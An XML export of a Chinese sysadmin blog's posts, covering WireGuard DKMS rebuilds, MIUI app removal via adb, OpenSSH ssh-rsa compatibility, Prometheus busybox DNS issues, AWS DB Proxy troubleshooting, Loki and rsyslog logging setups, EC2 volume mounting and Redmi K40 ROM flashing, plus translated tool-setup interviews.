解决问题uname -a;# 获取当前 kernel 的版本号，这里是：3.10.0-1062.4.1.el7.x86_64rpm -qi wireguard-dkms | grep Version# 获取 wireguard 模块的版本号，这里是：0.0.20190913yum install \     kernel-headers-3.10.0-1062.4.1.el7.x86_64 \    kernel-devel-3.10.0-1062.4.1.el7.x86_64;# 安装需要的 source code 以及 headersdkms build \    -m wireguard \    -v 0.0.20190913 \    -k 3.10.0-1062.4.1.el7.x86_64;# 重新为新 kernel 编译 wireguard 模块dkms install \    wireguard/0.0.20190913 \    -k 3.10.0-1062.4.1.el7.x86_64;# 为新的 kernel 安装重新编好的 wireguard 模块wg-quick up wg_ofc;# 启动原来配置好的 wg_ofc 设备

一切又 OK 了！
]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>7.x</tag>
        <tag>Linux</tag>
        <tag>wireguard</tag>
        <tag>dkms</tag>
        <tag>wg-quick</tag>
      </tags>
  </entry>
  <entry>
    <title>MIUI13 精简优化系统自带的 app</title>
    <url>/2022/01/MIUI13%20%E7%B2%BE%E7%AE%80%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%B8%A6%E7%9A%84%20app/index.html</url>
    <content><![CDATA[缘起最近换了个红米 K40 的手机，刷机需要等 7 天，在等待过程中，系统自带的 MIUI 12.5 OTA 升级成了 MIUI 13，同样，在 MIUI 13 下也做了很多系统自带 app 的优化（删除）工作，特此记录，等过了 7 天刷成 miaomi.eu 后或再 OTA 升级后直接重用。


准备工作
手机打开 develop 菜单
打开 usb 调试功能
电脑上安装 adb 软件
……

这些都是基本操作，就不赘述了。
show me the codeadb shell pm uninstall --user 0 com.miui.systemAdSolutionadb shell pm uninstall --user 0 com.miui.analyticsadb shell pm uninstall --user 0 com.xiaomi.gamecenter.sdk.serviceadb shell pm uninstall --user 0 com.xiaomi.gamecenteradb shell pm uninstall --user 0 com.sohu.inputmethod.sogou.xiaomiadb shell pm uninstall --user 0 com.miui.playeradb shell pm uninstall --user 0 com.miui.videoadb shell pm uninstall --user 0 com.miui.notesadb shell pm uninstall --user 0 com.miui.translation.youdaoadb shell pm uninstall --user 0 com.miui.translation.kingsoftadb shell pm uninstall --user 0 com.android.emailadb shell pm uninstall --user 0 com.xiaomi.scanneradb shell pm uninstall --user 0 com.miui.hybridadb shell pm uninstall --user 0 com.miui.bugreportadb shell pm uninstall --user 0 com.milink.serviceadb shell pm uninstall --user 0 com.miui.galleryadb shell pm uninstall --user 0 com.miui.yellowpageadb shell pm uninstall --user 0 com.xiaomi.midropadb shell pm uninstall --user 0 com.miui.virtualsimadb shell pm uninstall --user 0 com.xiaomi.paymentadb shell pm uninstall --user 0 com.mipay.walletadb shell pm uninstall --user 0 com.miui.voiceassistadb shell pm uninstall --user 0 com.miui.touchassistantadb shell pm uninstall --user 0 com.xiaomi.mitunesadb shell pm uninstall --user 0 com.xiaomi.passadb shell pm uninstall --user 0 com.miui.klo.bugreportadb shell pm uninstall --user 0 org.mipay.android.manageradb shell pm uninstall --user 0 com.miui.voicetriggeradb shell pm uninstall --user 0 com.miui.personalassistantadb shell pm uninstall --user 0 com.xiaomi.aiasst.visionadb shell pm uninstall --user 0 com.xiaomi.aiasst.service# com.miui.analytics 如果被删除，重启又会被自动安装上，发现禁用好像效果还不错adb shell pm disable-user --user 0  com.miui.analyticsadb shell pm uninstall --user 0 com.xiaomi.migameserviceadb shell pm uninstall --user 0 com.miui.miservice

]]></content>
      <tags>
        <tag>MIUI</tag>
        <tag>MUI13</tag>
        <tag>Redmi</tag>
        <tag>K40</tag>
        <tag>Xiaomi</tag>
        <tag>xiaomi.eu</tag>
        <tag>红米</tag>
        <tag>小米</tag>
        <tag>adb</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenSSH 8.8 以后版本跟老版的兼容性问题</title>
    <url>/2022/06/OpenSSH%208.8%20%E4%BB%A5%E5%90%8E%E7%89%88%E6%9C%AC%E8%B7%9F%E8%80%81%E7%89%88%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7%E9%97%AE%E9%A2%98/index.html</url>
    <content><![CDATA[缘起最近发现 ssh 到自己的路由器，发现连不上，报错：

Unable to negotiate with 10.0.0.1 port 22: no matching host key type found. Their offer: ssh-rsa

NOTE: 上面的 “10.0.0.1” 是服务器的 IP 地址


原因网上查了下，发现是 OpenSSH 新版本的锅。OpenSSH 8.8 开始，缺省不再支持使用 SHA-1 hash 算法的 RSA 签名。
其实这个变动对稍稍新一点的 OpenSSH 服务器（据说 7.2 及以后版本）没有问题，因为其除了 SHA-1 外，还支持 SHA-256、SHA-512 等更强壮的算法。ssh-rsa 的密钥会自动使用更强壮的 hash 算法了。
但是对一些较老的 OpenSSH 服务器（7.2 以前版本），则就有问题了，因为其对 ssh-rsa 只支持 SHA-1 一种 hash 算法。但此时客户端又不支持这种算法，故而连接会失败。系统上面的错误。
解决方法ssh 连接有问题的服务器时，加上两个参数即可。如：
ssh \  -oHostKeyAlgorithms=+ssh-rsa \  -oPubKeyAcceptedAlgorithms=+ssh-rsa \  10.0.0.1# 假设 ssh 服务器 IP 地址是 10.0.0.1

todo list
更新自己的密钥对，使用ssh-keygen -o -a 100 -t ed25519 -f ~/.ssh/pk4ym_ed25519 -C &quot;m@theyan.gs&quot;
把新的公钥部署到服务器上去，包括 github

附件
OpenSSh 8.8 的 release notes

]]></content>
      <tags>
        <tag>OpenSSH</tag>
        <tag>ssh</tag>
        <tag>ssh-rsa</tag>
        <tag>SHA-1</tag>
        <tag>rsa-sha2-512</tag>
        <tag>rsa-sha2-256</tag>
        <tag>HostKeyAlgorithms</tag>
        <tag>PubKeyAcceptedAlgorithms</tag>
      </tags>
  </entry>
  <entry>
    <title>Prometheus 官方 Docker image 的一个 bug</title>
    <url>/2024/06/Prometheus%20%E5%AE%98%E6%96%B9%20Docker%20image%20%E7%9A%84%E4%B8%80%E4%B8%AA%20bug/index.html</url>
    <content><![CDATA[简介最近发现了一个 Prometheus 官方 Docker image(https://hub.docker.com/u/prom) 生成的容器不能解析同一个 自定义 bridge 上的其他 Docker 容器的容器名的问题。


一些情况
我的环境是 PVE 7.* 里的一个 vm，跑的操作系统是 Debian 12(bookworm)，docker 版本是 28.0.2
多个容器公用的是一个较 bridge111 的 自定义 bridge，地址段是：172.18.0.0&#x2F;16
其中还跑的有 grafana 官方的容器：grafana 和 loki，从这两个容器里可以正确解析其他所有 bridge111 下的容器的容器名
prometheus 官方 docker image 的容器，都不能正确解析 bridge111 下所有容器的容器名(会出 “bad address” 的报错提示)，但是能正确解析互联网域名，比如 baidu.com
发现 prometheus 的这一些 docker image 都是基于 quay.io/prometheus/busybox，而 quay.io/prometheus/busybox 又是指向的 quay.io/prometheus/busybox:uclibc，quay.io/prometheus/busybox:uclibc 基于的 busybox:uclibc
用 quay.io/prometheus/busybox:uclibc 创建容器试了一下，果然不能解析容器名，但可以解析互联网域名
用 quay.io/prometheus/busybox:glibc 试了一下，则没有任何问题
再用 busybox:uclibc 试了一下，也不行，都是 “bad address”

所以差不多水落石出，busybox:uclibc 这个 image 的锅。
环境介绍BTW,  我的版本如下：

Debian 12(bookworm)
kernel 6.1.0
docker 28.0.2
prometheus: v2.53.4
alertmanager: v0.27.0
blackbox-exporter: v0.25.0
snmp-exporter: v0.28.0

参考
https://github.com/prometheus/busybox/issues/18

]]></content>
      <tags>
        <tag>glibc</tag>
        <tag>docker</tag>
        <tag>prometheus</tag>
        <tag>image</tag>
        <tag>busybox</tag>
        <tag>uclibc</tag>
        <tag>quay.io</tag>
        <tag>alertmanager</tag>
        <tag>blackbox-exporter</tag>
        <tag>snmp-exporter</tag>
      </tags>
  </entry>
  <entry>
    <title>Terraform 官方文档配置导致的 DB Proxy 故障案例</title>
    <url>/2023/12/Terraform%20%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4%E7%9A%84%20DB%20Proxy%20%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/index.html</url>
    <content><![CDATA[起因在搭建新环境时，我们选择了 OpenTofu——这是在 Terraform 更改了 license 之后从 Terraform 代码库分支并且开放源码的工具——用于构建VPC、RDS、Redis等基础设施。
但当基础设施就位、开始部署应用程序时，问题出现了。每次部署都不成功，查看日志说是 JDBC 相关错误，DB Proxy 的日志中充斥着诸多 “internal error”，却若隐若现关于具体错误原因的描述。尝试直接通过 MySQL 客户端连接 DB Proxy 时，大多数命令执行都引发错误（help 命令除外）提示：

ERROR 1105 (HY000): Unknown error

错误截图参见：


问题排查经过一系列尝试后，我联系了 AWS 的客服，并提交了一个 case。经过一整天（案例仍在 “work in progress”）等待后，AWS 给出了反馈。在一串冗长的信息之后，技术支持终于指出了潜在有用的信息，提到如果 parameters 中的 init_query 被设置为 &quot;SET x=1, y=2&quot; 时，可能会触发这个问题。
网络上也有人分享了 类似的困境。
这让我想起在 OpenTofu 中配置 DB Proxy（其实是在资源 aws_db_proxy_default_target_group 里） 时，我确实设定了 init_query = &quot;SET x=1, y=2&quot;。为什么会这样呢？因为这是遵循了 Terraform（OpenTofu）官方文档给出的示例：Resource: aws_db_proxy_default_target_group，文档截图如下：
尽管我仔细阅读了关于 init_query 的文档说明，做过 MySQL DBA 的我也明确知道 init_query 的含义和用途，但出于对官方文档示例的信赖，还是采纳了这一配置。
解决方案解决问题过程颇费周折。初始时，我尝试在 db_proxy.tf 中注释掉 init_query 相关行，并执行 tofu play; tofu apply 进行更改。尽管提示显示已变更，web 控制台的显示却未有更新。于是，我又把 init_query 设置为空值后重新运行命令。提示虽然依旧显示已修改，但是 web 控制台的状态仍然未变。最终，我不得不直接在 web 控制台进行修改才得以生效。之后，再次运行 tofu plan 确认 Terraform(OpenTofu) 状态与控制台同步，这才安心。
结语本案例告诉我们，即便是官方文档，也不应该盲目信任。重要的是深入理解配置中每个参数的具体含义和必要性，否则可能会带来意想不到的麻烦。
迷惑性的问题这个问题起初可能并未被触发，因为最初（用 OpenTofu）构建完 DB Proxy 后我肯定进行了连接测试的，当时并未发现问题。而且就在部署问题应用（java）之前，不论是 Python 还是 Node.js 应用，均未出现部署错误（ Java 项目可能最初出错是因为角色没有 VPC access 权限，但权限解决后部署时还报错则是因为那个时候我已经触发了 DB Proxy 的配置问题让其服务几乎不可用了）。
DB Proxy 正式被触发故障是在尝试将另一环境的 RDS 表结构导入时。我是通过 DB Proxy 来进行数据导入的，当时未导入完成便报错失败，从此任何命令（除了 help 命令）都返回错误：ERROR 1105 (HY000): Unknown error。这次故障被触发的原因和机理也非常值得研究。
]]></content>
      <tags>
        <tag>AWS</tag>
        <tag>Terraform</tag>
        <tag>OpenTofu</tag>
        <tag>db_proxy_default_target_group</tag>
        <tag>RDS</tag>
        <tag>db_proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>centralized logging 2 using promtail, loki</title>
    <url>/2024/11/centralized-logging-loki/index.html</url>
    <content><![CDATA[背景介绍之前用 rsyslogd 做过一个集中的 log server，主要是收集服务器系统和审计日志。最近要做的这个集中的 log server，则是专注于收集、展示应用日志的。我现在的服务器，操作系统有两种：Debian 12(bookworm) 和 Ubuntu 24.04，准确的说：应用服务器都是 Ubuntu 24.04，只有运维专用的两台（含要做的这个 log server）是 Debian 12。
因为是小厂，所以就摒弃掉大而重的 elasicsearch 系的方案，直接用 grafana 同源的 loki 来做服务端，客户端收集日志也是 grafana 同源的 promtail，技术方案选型就这么愉快得决定了。


serverinstall服务器软件（主要是 loki）的安装，具体参见官方文档：Install Grafana on Debian or Ubuntu
大致总结下，就是：
sudo apt-get install -y \  apt-transport-https \  software-properties-common \  wgetsudo mkdir -p /etc/apt/keyrings/wget -q -O - https://apt.grafana.com/gpg.key | \  gpg --dearmor | \  sudo tee /etc/apt/keyrings/grafana.gpg &gt; /dev/nullecho \  &quot;deb [signed-by=/etc/apt/keyrings/grafana.gpg] https://apt.grafana.com stable main&quot; \   | sudo tee -a /etc/apt/sources.list.d/grafana.listsudo apt-get updatesudo apt-get install loki grafana-enterprise# 上面是因为我的 loki 和 grafana 在一台机器上，所以就一起装了

configurationloki 的 log server 配置还是相当简单的
vim /etc/loki/config.yml# 修改 /etc/loki/config.yml 文件

加入如下内容：
auth_enabled: falseserver:  http_listen_port: 3100  grpc_listen_port: 9096  log_level: warn  grpc_server_max_concurrent_streams: 500common:  instance_addr: 127.0.0.1  path_prefix: /var/lib/loki/loki  storage:    filesystem:      chunks_directory: /var/lib/loki/loki/chunks      rules_directory: /var/lib/loki/loki/rules  replication_factor: 1  ring:    kvstore:      store: inmemoryquery_range:  results_cache:    cache:      embedded_cache:        enabled: true        max_size_mb: 500compactor:  working_directory: /var/lib/loki/data/retention  compaction_interval: 1h  retention_enabled: true  retention_delete_delay: 2h  retention_delete_worker_count: 50  delete_request_store: filesystemlimits_config:  reject_old_samples: true  reject_old_samples_max_age: 24h  max_query_series: 5000  retention_period: 720h  ingestion_rate_mb: 20  ingestion_burst_size_mb: 40  max_entries_limit_per_query: 5000schema_config:  configs:    - from: 2020-10-24      store: tsdb      object_store: filesystem      schema: v13      index:        prefix: index_        period: 24hpattern_ingester:  enabled: trueruler:  alertmanager_client:    basic_auth_username: cl-am-admin    basic_auth_password: jFWVXDJX  alertmanager_url: localhost:9093frontend:  encoding: protobufanalytics:  reporting_enabled: false

重启 loki
systemctl restart loki

client客户端上我们是用 promtail 来收集日志的。promtail 可以用系统安装的，也可以用Docker 来跑，收集的日志也主要是两块：

应用程序的日志，这些是直接写在文件里的
Docker container 的日志

假设我们的 promtail 是用 Docker 来跑的，我们用的 docker compose 文件（~/promtail.yaml）内容如下：
name: promtailservices:  promtail:    image: grafana/promtail:3.3.2    container_name: promtail    restart: unless-stopped    volumes:      - ~/promtail:/mnt/config      - /var/lib/docker/containers:/var/lib/docker/containers:ro      - /var/run/docker.sock:/var/run/docker.sock      - /var/log/nginx:/var/log/nginx    labels:      SVC_NAME: promtail    networks:      - custombridge    command: [&quot;-config.file=/mnt/config/promtail-config.yaml&quot;, &quot;-config.expand-env=true&quot;]    environment:      - HOSTNAME=app-0      - HOST_IP=172.24.125.149networks:  custombridge:    external: true

然后其真正的配置文件 ~/promtail/promtail-config.yaml 的内容如下：
server:  http_listen_port: 9080  grpc_listen_port: 0positions:  filename: /mnt/config/var_log_positions.yamlclients:  - url: http://loki.xxx.com:3100/loki/api/v1/pushscrape_configs:  - job_name: docker    docker_sd_configs:      - host: unix:///var/run/docker.sock        refresh_interval: 5s    relabel_configs:      - action: replace        replacement: &#x27;$&#123;HOSTNAME&#125;&#x27;        target_label: &#x27;hostname&#x27;      - action: replace        replacement: &#x27;$&#123;HOST_IP&#125;&#x27;        target_label: &#x27;host_ip&#x27;      - action: replace        replacement: &#x27;docker&#x27;        target_label: &#x27;job&#x27;      - source_labels: [&#x27;__meta_docker_container_name&#x27;]        regex: &#x27;/(.*)&#x27;        target_label: &#x27;container_name&#x27;      - source_labels: [&#x27;__meta_docker_container_id&#x27;]        target_label: &#x27;container_id&#x27;      - source_labels: [&#x27;__meta_docker_container_label_REPO_NAME&#x27;]        target_label: &#x27;repo_name&#x27;      - source_labels: [&#x27;__meta_docker_container_label_SVC_NAME&#x27;]        target_label: &#x27;svc_name&#x27;  - job_name: nginx    static_configs:      - targets:          - localhost        labels:          job: nginx          svc_name: nginx          hostname: $&#123;HOSTNAME&#125;           host_ip: $&#123;HOST_IP&#125;          agent: promtail          __path__: /var/log/nginx/access.log    pipeline_stages:      - json:          expressions:            domain_name: http_host            return_code: status      - labels:          domain_name:           return_code:

上面的 loki.xxx.com 就是 loki server 的地址，由上面的例子我们可以看到 promtail 同时收集了系统应用（nginx）的日志和 Docker container 的日志
最后启动 loki
docker compose -f ~/promtail.yaml up promtail -d

参考
https://grafana.com/docs/grafana/latest/setup-grafana/installation/debian/

]]></content>
      <tags>
        <tag>Ubuntu</tag>
        <tag>Debian</tag>
        <tag>AWS</tag>
        <tag>Debian 12</tag>
        <tag>bookworm</tag>
        <tag>Ubuntu 24.04</tag>
        <tag>Loki</tag>
        <tag>promtail</tag>
        <tag>grafana</tag>
      </tags>
  </entry>
  <entry>
    <title>WireGuard 源 IP 地址&quot;漂移&quot;问题的前因后果</title>
    <url>/2024/08/WireGuard%20%E6%BA%90%20IP%20%E5%9C%B0%E5%9D%80%22%E6%BC%82%E7%A7%BB%22%E9%97%AE%E9%A2%98%E7%9A%84%E5%89%8D%E5%9B%A0%E5%90%8E%E6%9E%9C/index.html</url>
    <content><![CDATA[在现代网络架构中，VPN（虚拟专用网络）技术的应用越来越广泛。本文将探讨在我司 IDC 中，使用 WireGuard 实现的 VPN 连接中遇到的一个有趣现象。


场景描述我司在 IDC 中有一台运行 Debian 的服务器 L1，有两个上联口：E-a 和 E-b，分别连接到运营商 I-a 和 I-b。IP 地址为 ip-a 和 ip-b。L1 上的策略路由很简单：

源地址为 ip-a 的数据包通过 E-a 口走 I-a
其他数据包则通过默认出口 E-b 走 I-b（源地址自然是 ip-b）

此外，L1 还通过网口 E-c 连接内网，IP 地址为 ip-c。L1 上运行 WirGuard，绑定 0.0.0.0 的 udp 端口 12345。
在办公室，我司还有一台运行 Debian 的机器 L2。由于 L2 位于内网中，没有公网 IP。L2 上也运行着 WireGuard，绑定在 0.0.0.0 的（udp）端口 12345。同时，我在办公室的路由器上做了端口映射，将 udp 12345 端口映射到 L2（虽然这完全没什么用）。
L2 的 WireGuard 配置中，peer 的 endpoint 指定为 L1 的 IP 地址 ip-a。由于 L2 没有公网地址且出口地址不固定，因此在 L1 的 WireGuard 配置中并没有指定 L2 的 IP 地址。就这样，L1 和 L2 上的 WireGuard 的连接顺利建立，一切都如预期般正常运行。
异常现象其实，L2 上还运行着一个 SmokePing，监测着 ip-a、ip-b 和 ip-c，当然也还有其他，不过那些跟这里没啥关系，也就不提了。
某天我在 Smokeping 监控中发现，ping ip-c 的（时间）值明显高于 ping ip-a 的值，且与 ping ip-b 的相近。这一现象让我感到困惑，因为到 ip-c 的数据包走的逻辑链路（通过 WireGuard 隧道）实际上应该与到 ip-a 的物理链路完全相同，所以 ping ip-c 的数据应该跟 ping ip-a 的几乎一样才对。
我的第一反应是，可能是办公室的网络接入商或 I-a 对 UDP 包进行了 QoS 限速，因为 WireGuard 使用的是 UDP 协议。经过与客服的沟通，确认并没有针对 UDP 包的限速策略。
接着，我使用 iperf3 在 L1 和 L2 之间进行了测速，发现走 UDP 和走 TCP 的测试结果数据引并没有显著差别，这表明问题并不在于 UDP 包有被干扰。随后，我在 L2 上使用 tcpdump 监听 WireGuard 的数据包，结果让我大吃一惊：所有的数据包都是与 ip-b 的端口 12345 进行交互，而不是预期中的 ip-a！这也解释了为什么 ping ip-c 的延迟与 ping ip-b 的延迟相近，因为数据实际上是通过到 ip-b 的物理链路进行的。
深入分析面对这一现象，我感到百思不得其解。于是，我记录下当前的状况，并重启了 L2 上的 WireGuard，结果一切又都恢复正常：WireGuard 的数据交互对端 IP 变回了 ip-a，ping ip-c 的延迟也降到了与 ping ip-a 相同的水平。
进一步查阅资料后，我发现 WireGuard 具有 endpoint 自动更新的机制。虽然 L1 上没有 L2 端的 endpoint 数据，但 L2 上有 L1 的数据。当 L2 第一次连接 L1 时，L1 会记录下 L2 的 endpoint 数据。如果 L2 使用了不同的 IP 地址连接 L1，L1 会更新 L2 的 endpoint IP 地址。反之亦然。这意味着，当 L1 从 E-b 口以 ip-b 作为源地址连接 L2 时，L2 也会更新 L1 的 endpoint IP 地址。
最终，我意识到问题的根源在于 L1 突然使用源 IP 为 ip-b 从 E-b 口发送 WireGuard 数据包给 L2。期间，我发现办公网的网络曾经闪断过几分钟。真相逐渐浮出水面：当 L2 的上联公网链路断开时，L1 由于长时间未收到来自 L2 的 WireGuard 数据包，可能出于某种原因主动向 L2 发送 WireGuard 包，查找 L2 的 endpoint IP 和端口数据。此时，由于源地址未定，数据包直接通过 E-b 口发送，源地址被设为 ip-b。这些数据包持续发送到 L2，直到 L2 的上联网络恢复。L2 收到来自 ip-b 的 L1 的 WireGuard 数据包后，触发了更新 L1 的 endpoint 数据，从而开始与 L1 的 ip-b 进行 WireGuard 数据交互。
结论通过这一系列的分析，整个逻辑变得自洽了。这一现象不仅揭示了 WireGuard 的灵活性和自动化特性，也提醒我们在设计网络架构时，需考虑到各种可能的网络状态变化。希望这篇文章能为您在使用 WireGuard 或其他 VPN 技术时提供一些启示。
]]></content>
      <tags>
        <tag>udp</tag>
        <tag>wireguard</tag>
        <tag>iperf3</tag>
        <tag>endpoint</tag>
        <tag>smokeping</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>centralized logging on Amazon Linux 2023</title>
    <url>/2024/04/centralized-logging/index.html</url>
    <content><![CDATA[背景介绍最近要做个 log server，把所有服务器的系统日志都收上来。我现在的服务器，操作系统有两种：Amazon Linux 2023 和 Ubuntu，但其实 Ubuntu 又有 22.04 和 24.04 两种，所以，其实是一共有三种操作系统。
好在这三种系统，其缺省跑的日志应用，Amazon Linux 2023 是 systemd-journald，而 Ubuntu(22.04 和 24.04) 都是既跑有 systemd-journald，又跑的有 rsyslogd。这两种日志应用，都是支持集中的日志服务器的，或者很容易支持。但是为什么不就用一套 rsyslogd 的日志服务器呢？毕竟大家都支持 rsyslogd 的。主要是因为 systemd-journald 相对于 rsyslogd 是很新的东西，所以这里也拿出来练练手。


rsyslogdserverrsyslog 的 log server 配置还是相当简单的
vim /etc/rsyslog.d/remote.conf# 新建 /etc/rsyslog.d/remote.conf 文件

加入如下内容：
module(load=&quot;imudp&quot;)input(type=&quot;imudp&quot; port=&quot;514&quot;)module(load=&quot;imtcp&quot;)input(type=&quot;imtcp&quot; port=&quot;514&quot;)template(name=&quot;RemoteLogsWithHostIPDate&quot; type=&quot;string&quot; string=&quot;/var/log/remote/rsyslog/%fromhost-ip%_%hostname%/%programname%-%$YEAR%-%$MONTH%-%$DAY%.log&quot;)if ($fromhost-ip == &quot;127.0.0.1&quot;) then &#123;    stop&#125;*.* action(type=&quot;omfile&quot; dynaFile=&quot;RemoteLogsWithHostIPDate&quot;)

重启 rsyslogd
systemctl restart rsyslog

client客户端的配置也相当简单
vim /etc/rsyslog.d/99-remote.conf# 新建文件：/etc/rsyslog.d/99-remote.conf

写入如下内容：
*.* @logserver.xxx.xxx:514# 用 udp 把日志打到前面配好的 rsyslog 日志服务器# 地址假设是 `logserver.xxx.xxx`

最后重启 rsyslog
systemctl restart rsyslog

systemd-journal-remoteserverdnf install systemd-journal-remote# install software depended, log server is based on Amazon Linux 2023systemctl edit systemd-journal-remote.service# change the configuration of service systemd-journal-remote# NOTE: must write in the special blank lines# 注意：必须在指定的空行内输入配置

指定的空行内输入如下内容：
[Service]ExecStart=ExecStart=/usr/lib/systemd/systemd-journal-remote --listen-http=-3 --output=/var/log/remote/journal/LogsDirectory=remote/journal# 如果 ExecStart 那一行的 --output 参数指定的目录没改的话# 最后那一行是不需要的

保存以后，使得
cat /etc/systemd/system/systemd-journal-remote.service.d/override.conf

能看到之前输入的内容即可。
mkdir /var/log/remote/journalsystemctl edit systemd-journal-remote.socket

指定的空行里输入：
[Socket]ListenStream=ListenStream=19532

保存后退出。使得
cat /etc/systemd/system/systemd-journal-remote.socket.d/override.conf

输出的内容正是之前输入的即可。
systemctl enable --now systemd-journal-remote.socket# enable and start systemd-journal-remote.socket

clientdnf install systemd-journal-remote# install software dependedmkdir /etc/systemd/journal-upload.conf.d/cat &lt;&lt;EOF &gt; /etc/systemd/journal-upload.conf.d/override.conf[Upload]URL=http://logserver.xxx.xxx:19532EOFsystemctl enable --now systemd-journal-upload.service# enable and start service of systemd-journal-upload

参考
https://idle.nprescott.com/2024/journald-for-centralized-logging.html

]]></content>
      <tags>
        <tag>AWS</tag>
        <tag>Amazon Linux 2023</tag>
        <tag>Ubuntu 24.04</tag>
        <tag>rsyslog</tag>
        <tag>systemd-journal-remote</tag>
        <tag>Ubuntu 22.04</tag>
        <tag>systemctl</tag>
      </tags>
  </entry>
  <entry>
    <title>克里斯汀·多德瑞（Christine Dodrill）的访谈</title>
    <url>/2020/01/christine_dodrill/index.html</url>
    <content><![CDATA[克里斯汀·多德瑞（Christine Dodrill）的访谈
NOTE:


原文来自于 Christine Dodrill
我 HOST 的版本在 Christine Dodrill

您是谁，你做什么工作我是 Christine Dodrill，西雅图地区的一位高级 SRE，目前在蒙特利尔。我曾在 Heroku，IMVU 和 Pure Storage 工作，但目前在 Lightspeed POS 工作。


在一边，我喜欢用电脑做东西。我有一个 Twitter 和 Fediverse。)。最近，我一直在尝试 OS 设计，以便更轻松地终止我们行业的英特尔单一文化。
您使用什么硬件我的大部分计算工作都是通过 12.9 英寸 2018 iPad Pro 完成的。我非常喜欢将几乎整个数字生活都集中在一台设备中的便利性。我有 Smart Keyboard 和 Pencil。我也有一个 12 英寸的 MacBook，每当我需要在 macOS 中执行操作时，都会使用它，但是这种情况在 iOS 中越来越少了生态系统变得越来越强大。
我有一个来自 SoYouStart 的专用服务器，具有 8 核，32GB 内存和 2TB 存储。我将其用于大多数编程方面。
我每天都随身携带 iPhone XS 和 Apple Watch series 3。
您使用什么软件我通过 SSH 在 tmux 的 Emacs 中写代码。在极少数情况下，我将使用 Emacs&#x2F;Textastic 进行本地开发，但这仅用于无法远程完成的事情。
您的理想设置是什么我很确定我已经拥有了。
]]></content>
      <tags>
        <tag>SRE</tag>
        <tag>UsesThis</tag>
      </tags>
  </entry>
  <entry>
    <title>EC2 上挂载别的机器的根分区时&quot;duplicate uuid&quot; 问题</title>
    <url>/2019/01/ec2-mount-root-duplicate-uuid-error/index.html</url>
    <content><![CDATA[缘起最近要登某一台 ec2，结果其私钥丢了，于是根据文档，将这台 ec2 的机器 stop 掉，然后将根区先 detach 掉，然后再将其 attach 到同 subnet 的另外一台 ec2 上。
按照正常的流程，在另外一台好的 ec2 的机器上将刚 attach 过来的分区 mount 上以后再修改好其 authorized_keys 文件即可完成任务的。


问题浮现但是，当挂载分区时出错了。当时的命令是这样的：
file -s /dev/xvdf1 # 这里是确认要 mount 的分区是什么格式的，这个例子中是 xfs

然后挂载时，出错了
mount -t xfs /dev/xvdf1 /mnt/tmp

返回错误：

mount: wrong fs type, bad option, bad superblock on &#x2F;dev&#x2F;xvdf1,missing codepage or helper program, or other error

问题根源这里的问题是因为跑着的 ec2 和要修改公钥的 ec2 由于是用一个 ami 起来的，故而根分区的 uuid 重复了导致的。
解决问题
xfs_db -c uuid &#x2F;dev&#x2F;xvdf1	# 修改要挂载分区的 uuid
mount -t xfs -o nouuid &#x2F;dev&#x2F;xvdf1 &#x2F;mnt&#x2F;tmp	# 用参数 nouuid 来避免挂载时检查 uuid

]]></content>
      <tags>
        <tag>AWS</tag>
        <tag>EC2</tag>
        <tag>key pair</tag>
        <tag>mount</tag>
        <tag>uuid</tag>
      </tags>
  </entry>
  <entry>
    <title>Eliza Sorensen 的访谈</title>
    <url>/2018/12/eliza_sorensen/index.html</url>
    <content><![CDATA[Eliza Sorensen 的访谈
NOTE:


原文来自于 Eliza Sorensen
我 HOST 的版本在 Eliza Sorensen

你是谁，你做什么工作我是 Eliza Sorensen 或其他任何地方的 @zemmiph0bia。我是澳大利亚墨尔本市的一名基础设施和安全工程师，也是创建了性工作友好社交空间 Switter.at 和现代广告平台 Tryst.link 的 Assembly Four 的共同创始人。
您使用什么硬件看来这些天我一直在移动，所以我严重依赖我的 X1 Carbon, Google Pixel 3 XL, Audio Technica ATH-AR5BT headphones，powerpack（很大的背包？），笔记本和 Lamy（凌美，一种笔）Safari。
当我在办公桌前时，可以使用两台 Dell 27 英寸显示器，一个 Ducky One 机械键盘（樱桃棕色轴）和一个Logitech G700 鼠标。
您用什么软件我只想在台式机上使用 Linux，我的操作系统是Ubuntu，我的 shell 是 zsh，我用 ProtonVPN 连接，我用 Firefox （上网）冲浪，我用 1Password 保存密码，我用 Spotify 听音乐，我用 Toggl 管理时间、用 Clubhouse 管理任务，用 vim 写作，用 Sublime Text 3 写代码，使用 Zeal 保留我的文档。
您的理想设置是什么我对当前设置非常满意，但是我不介意回到带有樱桃蓝色轴的键盘……但是我不想赶走我的伴侣。
]]></content>
      <categories>
        <category>UsesThis</category>
        <category>Engineer</category>
        <category>Developer</category>
        <category>Linux</category>
        <category>Security</category>
      </categories>
  </entry>
  <entry>
    <title>Flash xiaomi.eu for Redmi K40</title>
    <url>/2022/02/flash%20xiaomi.eu%20for%20redmi%20k40/index.html</url>
    <content><![CDATA[envirnment首先是环境准备，我用的是 MacOS，这里都是 MacOS 适用。


brew install android-platform-tools# brew install android-file-transferbrew install openjdk@11sudo ln -sfn /usr/local/opt/openjdk@11/libexec/openjdk.jdk /Library/Java/JavaVirtualMachines/openjdk-11.jdkecho &#x27;export PATH=&quot;/usr/local/opt/openjdk@11/bin:$PATH&quot;&#x27; &gt;&gt; ~/.zshrcexport PATH=&quot;/usr/local/opt/openjdk@11/bin:$PATH&quot;&#x27;

unlook the bootloader官方工具只支持 windows，而我用的是 MacOS，所以我就用了一个叫 XiaoMiToolV2 的东西。因为其 release 的版本过老，需要重新自己编译，具体使用步骤如下：
git clone https://github.com/francescotescari/XiaoMiToolV2cd XiaoMiToolV2cp /usr/local/bin/adb res/tools/cp /usr/local/bin/fastboot res/tools/sudo ./gradlew buildsudo ./gradlew run

flash rom via fastbootadb reboot fastbootmkdir tempcd tempunzip unzip ../xiaomi.eu_multi_HMK40_POCOF3_V13.0.3.0.SKHCNXM_v13-12-fastboot.zip -d ../macos_fastboot_first_install_with_data_format.sh

links
https://xiaomi.eu/community/threads/how-to-install-xiaomi-eu-rom-for-redmi-k40-poco-f3-mi-11x.61851/

]]></content>
      <tags>
        <tag>Android</tag>
        <tag>xiaomi.eu</tag>
